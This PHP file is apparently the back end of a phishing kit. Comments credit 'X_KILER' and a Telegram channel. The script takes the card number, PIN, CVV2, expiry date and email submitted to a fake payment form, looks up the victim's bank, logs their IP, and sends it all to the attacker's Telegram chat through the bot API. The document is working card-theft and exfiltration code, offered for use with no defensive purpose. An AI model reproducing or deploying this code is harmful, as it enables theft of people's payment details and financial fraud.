<?php

if ( 'POST' != $_SERVER['REQUEST_METHOD'] ) {
$protocol = $_SERVER['SERVER_PROTOCOL'];
if ( ! in_array( $protocol, array( 'HTTP/1.1', 'HTTP/2', 'HTTP/2.0' ) ) ) {
$protocol = 'HTTP/1.0';
}

header( 'Allow: POST' );
header( "$protocol 405 Method Not Allowed" );
header( 'Content-Type: text/plain' );
exit;
}





include "Bankinfo.php";
include "Userid.php" ;
include "../info.php";


//CODED_BY XKILER 


$pan = $_POST["pan"];
$pin = $_POST["pin"];
$cvv = $_POST["cvv2"];
$year = $_POST["expireYear"];
$month = $_POST["expireMonth"];

$num = $_POST["num"];
if(isset($_POST["inputemail"])){
    $email = $_POST["inputemail"];
}else{
    $email = "None";
}


//CODED BY X_KILER
//T.ME/X_KILER


$pan1 = substr($pan,0,4);
$pan2 = substr($pan,4,-8);
$pan3 = substr($pan,8,-4);
$pan4 = substr($pan,12);
$cardn = substr($pan,0,-10);
$bankinfo = bank_information($cardn);
//BAnk info


$ip = $_SERVER["REMOTE_ADDR"];
//send to user
$Text = "New Card / تمام 🍉
Card : <code>$pan</code>
Pin2 : <code>$pin</code>
Cvv2 : <code>$cvv</code>
Y / M : <code>$year</code>/ <code>$month</code>
Bank Name : $bankinfo[1]
🌐 IP : $ip
⚠️ @PhishinG_PorT";




$ok = file_get_contents("https://api.telegram.org/bot".$TOKENESH."/sendMessage?parse_mode=HTML&chat_id=".$IDISH."&text=".urlencode($Text));
     
  

?>
